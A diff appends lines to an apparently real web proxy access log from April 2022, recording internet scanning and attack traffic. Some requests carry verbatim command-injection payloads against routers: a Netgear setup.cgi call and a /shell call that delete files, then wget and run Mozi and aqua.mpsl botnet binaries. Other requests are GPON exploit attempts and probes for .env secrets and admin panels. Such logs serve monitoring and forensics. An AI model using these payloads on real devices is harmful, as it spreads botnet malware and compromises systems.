@@ -6779,3 +6779,33 @@
 [2022-04-08T04:54:21.393Z] "GET / HTTP/1.1" 301 - 0 0 0 - 46.161.165.247 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?IP?:8080 -
 [2022-04-08T06:21:18.281Z] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 426 - 0 0 0 - --117.32.88.58++ - - - -
 [2022-04-08T06:23:06.599Z] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 - 0 0 0 - 115.60.162.137 "Hello, World" ? 127.0.0.1:80 -
+[2022-04-08T06:41:24.483Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 107.130.226.91 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-04-08T06:41:25.241Z] "POST / HTTP/1.1" 301 - 0 0 0 - 107.130.226.91 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-04-08T07:05:08.562Z] "GET / HTTP/1.1" 301 - 0 0 0 - 192.241.224.69 "Mozilla/5.0 zgrab/0.x" ? ?IP?:8443 -
+[2022-04-08T07:40:49.334Z] "GET /phpmyadmin/ HTTP/1.1" 301 - 0 0 0 - 110.180.155.80 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?IP? -
+[2022-04-08T08:10:39.422Z] "GET / HTTP/1.0" 426 - 0 0 0 - --190.211.214.204++ - - ?IP? -
+[2022-04-08T08:13:36.421Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --192.241.222.140++ - - - -
+[2022-04-08T08:27:19.442Z] "GET / HTTP/1.1" 301 - 0 0 0 - 2.32.30.56 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?IP?:8080 -
+[2022-04-08T08:38:47.273Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --192.241.222.85++ - - - -
+[2022-04-08T09:32:31.266Z] "GET / HTTP/1.1" 301 - 0 0 0 - 2.183.94.214 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?IP?:8080 -
+[2022-04-08T10:05:09.691Z] "GET / HTTP/1.1" 301 - 0 0 0 - 82.139.187.78 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" ? ?IP?:8080 -
+[2022-04-08T10:09:44.013Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 20.80.178.202 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" ? voice.dt-bd.com -
+[2022-04-08T10:09:45.312Z] "GET /wp-content/ HTTP/1.1" 301 - 0 0 0 - 20.80.178.202 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" ? voice.dt-bd.com -
+[2022-04-08T11:28:43.466Z] "POST /editBlackAndWhiteList HTTP/1.1" 301 - 0 0 0 - 177.141.68.165 0xAbyssalDoesntExist ? ?IP?:80 -
+[2022-04-08T11:50:47.569Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --37.221.67.248++ - - - -
+[2022-04-08T12:03:39.616Z] "GET / HTTP/1.1" 301 - 0 0 0 - 190.248.135.163 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?IP?:8080 -
+[2022-04-08T12:35:06.724Z] "GET /actuator/health HTTP/1.1" 301 - 0 0 0 - 192.241.222.251 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-04-08T12:45:25.269Z] "GET /actuator/health HTTP/1.1" 301 - 0 0 0 - 192.241.215.225 "Mozilla/5.0 zgrab/0.x" ? ?IP?:8080 -
+[2022-04-08T13:33:25.753Z] "GET / HTTP/1.1" 301 - 0 0 0 - 213.149.31.166 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?IP?:80 -
+[2022-04-08T14:11:38.382Z] "POST /GponForm/diag_Form?style/ HTTP/1.1" 301 - 0 0 0 - 172.245.10.242 curl/7.3.2 ? 192.168.0.1:443 -
+[2022-04-08T14:58:26.733Z] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://104.248.94.102/bins/aqua.mpsl;sh+/tmp/aqua.mpsl HTTP/1.1" 301 - 0 0 0 - 103.147.192.144 "Hello, world" ? 127.0.0.1:80 -
+[2022-04-08T15:18:51.656Z] "POST /ddns_check.cpp HTTP/1.1" 301 - 0 0 0 - 191.232.38.25 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36" ? ?IP?:8080 -
+[2022-04-08T15:18:57.321Z] "GET / HTTP/1.1" 301 - 0 0 0 - 191.232.38.25 curl/7.58.0 ? ?IP? -
+[2022-04-08T15:30:06.007Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 193.56.29.198 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-04-08T15:30:06.853Z] "POST / HTTP/1.1" 301 - 0 0 0 - 193.56.29.198 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-04-08T15:38:53.633Z] "GET /config/getuser?index=0 HTTP/1.1" 301 - 0 0 0 - 137.184.36.19 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" ? ?IP?:80 -
+[2022-04-08T16:02:33.377Z] "GET / HTTP/1.1" 301 - 0 0 0 - 36.74.40.161 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?IP?:8080 -
+[2022-04-08T16:14:51.543Z] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 - 0 0 0 - 115.51.88.254 "Hello, World" ? 127.0.0.1:8080 -
+[2022-04-08T16:51:00.295Z] "POST /GponForm/diag_Form?style/ HTTP/1.1" 301 - 0 0 0 - 198.23.172.243 curl/7.3.2 ? 192.168.0.1:443 -
+[2022-04-08T17:03:11.935Z] "- - HTTP/1.1" 400 DPE 0 11 1 - --192.241.223.206++ - - - -
+[2022-04-08T17:37:09.902Z] "GET / HTTP/1.1" 301 - 0 0 0 - 202.150.151.86 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?IP?:80 -
